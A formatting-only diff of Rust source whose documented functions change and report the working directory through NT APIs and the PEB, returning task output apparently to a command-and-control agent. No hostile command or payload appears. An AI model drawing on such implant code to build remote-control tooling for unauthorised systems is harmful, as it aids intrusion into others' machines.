@@ -1,9 +1,5 @@
-use mod_win32::{
-    nt_path::change_directory, nt_peb::get_current_directory, nt_time::current_timestamp,
-};
-use rs2_communication_protocol::{
-    communication_structs::task_output::TaskOutput, metadata::Metadata,
-};
+use mod_win32::{nt_path::change_directory, nt_peb::get_current_directory, nt_time::current_timestamp};
+use rs2_communication_protocol::{communication_structs::task_output::TaskOutput, metadata::Metadata};
 
 /// Changes the current working directory to the specified path.
 ///
@@ -13,13 +9,13 @@ use rs2_communication_protocol::{
 /// returns a failure status code, which is encapsulated in the `TaskOutput`.
 ///
 /// # Nt API Involved
-/// - `NtOpenFile`: Used internally to open the specified directory. If the operation
-///   is unsuccessful, the NT status code is returned and converted to a failure result.
+/// - `NtOpenFile`: Used internally to open the specified directory. If the operation is unsuccessful, the NT status
+///   code is returned and converted to a failure result.
 ///
 /// # Parameters
 /// - `path`: A string slice representing the target directory path to switch to.
-/// - `metadata`: Metadata that includes additional information to be recorded as part
-///   of the command execution (e.g., timestamps, system details).
+/// - `metadata`: Metadata that includes additional information to be recorded as part of the command execution (e.g.,
+///   timestamps, system details).
 ///
 /// # Returns
 /// - `TaskOutput`: A structure containing the details of the command execution, including:
@@ -63,8 +59,8 @@ pub fn command_cd(path: &str, metadata: Metadata) -> TaskOutput {
 /// If the directory cannot be retrieved, an error is recorded in the `TaskOutput`.
 ///
 /// # Details
-/// - The function reads the current directory path directly from the PEB. If it fails,
-///   the function returns a failure result.
+/// - The function reads the current directory path directly from the PEB. If it fails, the function returns a failure
+///   result.
 ///
 /// # Parameters
 /// - `metadata`: Metadata that includes additional information to be recorded as part of the command execution.
